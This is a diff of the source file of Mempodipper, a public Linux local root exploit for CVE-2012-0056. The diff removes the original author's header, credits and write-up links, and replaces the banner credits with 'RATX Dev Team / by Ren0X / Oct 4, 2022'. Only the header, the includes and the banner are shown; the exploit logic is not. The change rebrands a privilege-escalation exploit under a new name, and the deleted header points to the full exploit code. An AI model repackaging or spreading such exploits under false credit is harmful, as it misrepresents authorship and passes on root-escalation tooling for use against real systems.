@@ -1,33 +1,3 @@
-/*
-Exploit code is here: http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c
-Blog post about it is here: http://blog.zx2c4.com/749
-EDB-Note: Updated version can be found here: https://www.exploit-db.com/exploits/35161/
-
-# Exploit Title: Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64-bit
-# Date: Jan 21, 2012
-# Author: zx2c4
-# Tested on: Gentoo, Ubuntu
-# Platform: Linux
-# Category: Local
-# CVE-2012-0056
-
-
- * Mempodipper
- * by zx2c4
- * 
- * Linux Local Root Exploit
- * 
- * Rather than put my write up here, per usual, this time I've put it
- * in a rather lengthy blog post: http://blog.zx2c4.com/749
- * 
- * Enjoy.
- * 
- * - zx2c4
- * Jan 21, 2012
- * 
- * CVE-2012-0056
- */
-
 #define _LARGEFILE64_SOURCE 
 #include <stdio.h>
 #include <string.h>
@@ -148,9 +118,9 @@ int main(int argc, char **argv)
 	}
 	
 	printf("===============================\n");
-	printf("=          Mempodipper        =\n");
-	printf("=           by zx2c4          =\n");
-	printf("=         Jan 21, 2012        =\n");
+	printf("=         RATX Dev Team       =\n");
+	printf("=           by Ren0X          =\n");
+	printf("=          Oct 4, 2022        =\n");
 	printf("===============================\n\n");
 	
 	int parent_pid = getpid();
